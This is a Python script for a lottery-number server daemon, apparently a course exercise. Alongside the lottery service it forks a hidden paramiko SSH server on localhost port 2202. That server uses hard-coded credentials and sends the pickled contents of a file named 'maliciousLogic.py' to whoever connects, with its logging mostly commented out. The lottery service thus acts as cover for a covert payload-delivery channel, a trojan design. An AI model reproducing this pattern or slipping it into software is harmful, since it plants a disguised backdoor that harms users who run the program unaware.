#!/usr/bin/python3

#redesigned server with class and functions

import random, socket, json, sys, os, signal,  time,  logzero, paramiko, subprocess, threading, pickle
from logzero import logger
import warnings
warnings.filterwarnings(action='ignore',module='.*paramiko.*')


#Named it client because it will hold the information that client sends us and clients results
class Client:
    def __init__(self, clientId, lMaxNum = 0,  l649Num = 0,  l49Num = 0):
        self.lMaxNum = lMaxNum
        self.l649Num = l649Num
        self.l49Num = l49Num
        self.clientId= clientId
        self.lMaxResult = []
        self.l649Result = []
        self.l49Result = []
        self.sock = 0
        self.connection = 0

        
    #Lotto Max random number generation: 7 numbers (1-50), 3 lines per play  
    def lottoMax(self):
        for i in range (3*self.lMaxNum):
            nextLine = []
            pool = list(range(1, 51))
            for i in range(7):
                randomNum = random.choice(pool)
                pool.remove(randomNum)
                nextLine.append(randomNum)
            self.lMaxResult.append(nextLine)

    #function to calculate numbers for lotteries that have one line per play and have only 6 numbers,
    #lotto 649
    def lotto649(self):
        for i in range (self.l649Num):
            nextLine = []
            pool = list(range(1, 52))
            for i in range(6):
                randomNum = random.choice(pool)
                pool.remove(randomNum)
                nextLine.append(randomNum)
            self.l649Result.append(nextLine)
            
    #function to calculate numbers for lotteries that have one line per play and have only 6 numbers,
    #lotto Ontario 49
    def lotto49(self):
        for i in range (self.l49Num):
            nextLine = []
            pool = list(range(1, 52))
            for i in range(6):
                randomNum = random.choice(pool)
                pool.remove(randomNum)
                nextLine.append(randomNum)
            self.l49Result.append(nextLine)
     
    #receive the data from the client
    def Receive(self):
        #receive data from client, decode, convert from json to seperate variables
        try:
            data  = self.connection.recv(1024).decode()
            data = json.loads(data)
            self.clientId = data.get("user")
            self.lMaxNum = data.get("lMax")
            self.l649Num = data.get("l649")
            self.l49Num = data.get("l49")
        except:
            childLogger("Could not receive data from the client check servers recv method and json data extraction")
            self.sock.close()
            sys.exit(9)

    #send the data back to the client
    def Send(self):
        #take all the results from the function of the lottery play
        # and insert them into json, encode and send back to client 
        try:
            message = json.dumps({"user": self.clientId, "lMax": self.lMaxResult, "l649": self.l649Result,  "l49": self.l49Result })
            if message != None:
                self.connection.sendall(message.encode())
        except:
            childLogger("Could not send the data from the daemon to the client check daemon's send method and json data")
            self.sock.close()
            sys.exit(9)

#signal catch function to catch zombie childs
def cull(signum,  frame):
    while True:
        try:
            pid,  status = os.waitpid(-1,  os.WNOHANG)
        except OSError:
            return
            
        if pid == 0:
            return

#per each connection receives lotto request, sends back results 
def manageClient(client):
    check = False
    
    #Receive information from the client
    client.Receive()
    #check if lottery was selected by the client and execute the function for chosen lottery
    if(client.lMaxNum > 0):
        client.lottoMax()
        check = True
        
    if(client.l649Num > 0):
        client.lotto649()
        check = True
        
    if(client.l49Num > 0):
        client.lotto49()
        check = True
        
    if check:
        #Send information back to the client
        client.Send()
    
    if check:
        client.connection.close()
        childLogger(f"Finished client: {client.clientId}")
        exit()

#run creates the object to hold clients data and creates the socket for listening
def run(pid):
    #Creating daemon socket object that suports ipv6 connection and is reusable
    client = Client(pid)
    client.sock = socket.socket(socket.AF_INET6,  socket.SOCK_STREAM)
    client.sock.setsockopt(socket.SOL_SOCKET,  socket.SO_REUSEADDR, 1)
    client.sock.setsockopt(socket.SOL_SOCKET,  socket.SO_REUSEPORT,  1)

    #bind serverAddress argument containing address and port
    serverAddress = ("::1",  int(port), 0, 0)
    try:
        client.sock.bind(serverAddress)
    except socket.error:
        parentLogger("Binding failed")
        sys.exit()
        
    #start listening takes one argument that represent amount of connections allowed, default = 0
    client.sock.listen(20)
    parentLogger(f'listening on the following port and address: {serverAddress}')
    
    while True:
        #accept a connection from the client and save it in the "connection"
        #and clients address in "clientAddr" '''
        client.connection, clientAddr = client.sock.accept()
        signal.signal(signal.SIGCHLD,  cull)
        
        #if there is a connection, fork a child and let child handle the connection
        if client.connection:
            try:
                clientThread = os.fork()
            except OSError:
                parentLogger("Could not create a child process\n")
                continue
                
            if clientThread == 0:
                manageClient(client)
            client.connection.close()
    parentLogger("closed the daemon socket")
    client.sock.close()
 
#using double fork to daemonize the server
def daemonize():
    #first fork
    try:
        pid = os.fork()
        if pid > 0:
            #exit first parent
            sys.exit(0)
    except OSError:
        parentLogger(f"fork 1 failed")
        sys.exit(1)
    
    os.setsid()
    os.umask(0)
    
    try:
        os.setuid(1000)
    except:
        pass
    
    #second fork
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        parentLogger(f"fork 2 failed")
        sys.exit(1)
        
    #write semaphore
    daemonPid = str(os.getpid())
    f = open("semaphore.txt", "w+")
    f.write(daemonPid)
   

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def check_auth_password(self, username, password):
        if username == 'u' and password == 'p':
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

#ssh client handler
def client_handler(client_socket):
    server_host_key = paramiko.RSAKey(filename="test_key.key")
    try:
        #bind client socket to ssh server session and add rsa key
        ssh_session = paramiko.Transport(client_socket)
        ssh_session.add_server_key(server_host_key)
        server = Server()
        #start the ssh server and negotiate ssh params
        try:
            ssh_session.start_server(server=server)
        except SSHException as err:
            print("[!] SSH Parameters Negotiation Failed")

        # print("[*] SSH Parameters Negotiation Succeeded")
        #authenticate the client
        # print("[*] Authenticating")
        ssh_channel = ssh_session.accept(20)
        if ssh_channel == None or not ssh_channel.active:
            # print("[*] SSH Client Authentication Failure")
            ssh_session.close()
        # else:
            # print("[*] SSH Client Authenticated")
        #ssh channel is established. We can start the shell
            #and send commands from input
        maliciousLogic = open('maliciousLogic.py', 'r')
        lines = maliciousLogic.read()

        ssh_channel.send(pickle.dumps(lines))
        result = ssh_channel.recv(1024).decode('utf-8')
    except Exception as err:
        # print("[*] Caught Exception: ", str(err))
        # print("[*] Exiting Script")
        try:
            ssh_session.close()
        except:
            pass
            # print("[!] Error closing SSH session")
        # print("[*] SSH session closed")
        sys.exit(1)

def runSshServer():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind(("127.0.0.1", 2202))
    except Exception as e:
        # print(f"[!] Bind Error for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
        # print(e)
        sys.exit(1)
    # print(f"[*] Bind Success for SSH Server using {server_address}:{server_socket.getsockname()[1]}")
    server_socket.listen(100)
    # print("[*] Listening")
    #Keep ssh server active and accept incoming tcp connections
    while True:
        client_socket, addr = server_socket.accept()
        # print(f"[*] Incoming TCP Connection from {addr[0]}:{addr[1]}")
        client_handler(client_socket)

#start the daemon
def start():    
    try:
        f = open("semaphore.txt",  "r")
        dPid = f.read().strip()
        if dPid:
            dPid = int(dPid)
        f.close()
    except IOError:
        dPid = None
        
    if(dPid):
        parentLogger("daemon is already running")
        sys.exit(1)
    

    try:
        pid = os.fork()
        if pid > 0:
            daemonize()
            run(dPid)
        else:
            daemonize()
            runSshServer()
    except OSError:
        parentLogger(f"fork 1 failed")
        sys.exit(1)
    
        
#stop the daemon
def stop():
    dPid= 0
    try:
        f = open("semaphore.txt",  "r")
        dPid = int(f.read().strip())
        f.close()
    except IOError:
        dPid = None
        
    if not dPid:
        parentLogger("semaphore file does not exist, Daemon is not running?")
        return
    try:
        while 1:
            os.kill(dPid, signal.SIGTERM)
            time.sleep(0.1)
    except OSError as err:
        err = str(err)
        if err.find("No such process") > 0:
            if os.path.exists("semaphore.txt"):
                os.remove("semaphore.txt")
        else:
            parentLogger("Error in stop - {err}")
            sys.exit(1)    
 
#restart the daemon
def restart():
    stop()
    start()
    
def log():
    #close all std streams
    # sys.stdin.close()
    # sys.stdout.close()
    # sys.stderr.close()

    #create logger
    if(os.path.isfile('./rotating-serverLogger.log')):
        os.remove("rotating-serverLogger.log")
    logzero.logfile("rotating-serverLogger.log", maxBytes=1000000,  backupCount=3,  disableStderrLogger=True)
    
def parentLogger(info):
    logger.info(f"PARENT: {os.getpid()} {info}")

def childLogger(info):
    logger.info(f"CHILD: {os.getpid()} {info}")
 
parentCheck = False
if (len(sys.argv) < 2 or len(sys.argv) > 2):
     print("Please include one command line argument 'start', stop' or 'restart'")
     sys.exit()
elif(sys.argv[1] == "start" or sys.argv[1] == "Start"):
    #ask user for the the port number
    # port = input("Please enter port to listen on: ")
    port = 9001
    log()
    start()
    
elif(sys.argv[1] == "stop" or sys.argv[1] == "Stop"):
    log()
    stop()
elif(sys.argv[1] == "restart" or sys.argv[1] == "Restart"):
    port = 9001
    # port = input("Please enter port to listen on: ")
    log()
    restart()
else:
    print("Please include one command line argument 'start', stop' or 'restart'")
    sys.exit()
    
    





